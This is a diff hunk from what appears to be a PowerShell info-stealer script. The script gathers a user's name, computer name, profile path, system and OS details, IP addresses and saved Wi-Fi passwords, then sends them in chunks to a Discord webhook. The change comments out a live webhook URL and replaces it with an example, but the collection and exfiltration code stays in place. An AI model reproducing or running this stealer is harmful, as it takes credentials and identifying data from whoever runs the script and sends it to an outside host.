@@ -40,7 +40,7 @@ $computerSystem = Invoke-Expression 'Get-WmiObject Win32_ComputerSystem' | Out-S
 $data = "Username: " + $env:USERNAME + "`nComputer name: " + $env:COMPUTERNAME + "`nDisc location: " + $env:USERPROFILE + "`nComputer system: " + $computerSystem + "`nOS: " + $os + "`n`n`nIPv4: " + $ipv4Address + "`nMore IP info: " + $ip + "`nWifi password(s):`n" + $wifi
 
 # Set the Discord webhook URL
-$webhookUrl = "https://discordapp.com/api/webhooks/1199979603293388810/GVsXlbrSlcpgPr8paE-pP2GEnmlCJ5KruxNY1KdJG6p2AYPc9p7Ybtg3lQf9etEzq1xy"
+# e.g. $webhookUrl = "https://discordapp.com/api/webhooks/1199979603293388810/GVsXlbrSlcpgPr8hJu-pP2GEnmlCJ5KruxNY1KdJG6p2AYPc9p7Ybtg3lQf9etEzq1xy"
 
 # Send the request to the Discord webhook (split into chunks)
 Send-DiscordWebhook -WebhookUrl $webhookUrl -Content $data
